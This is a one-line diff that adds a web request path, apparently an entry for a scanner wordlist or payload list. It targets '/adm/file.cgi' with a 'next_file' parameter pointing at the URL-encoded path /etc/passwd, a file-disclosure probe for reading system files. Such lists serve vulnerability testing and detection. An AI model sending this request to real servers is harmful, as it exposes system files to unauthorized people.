@@ -1,0 +1,1 @@
+/adm/file.cgi?next_file=%2fetc%2fpasswd
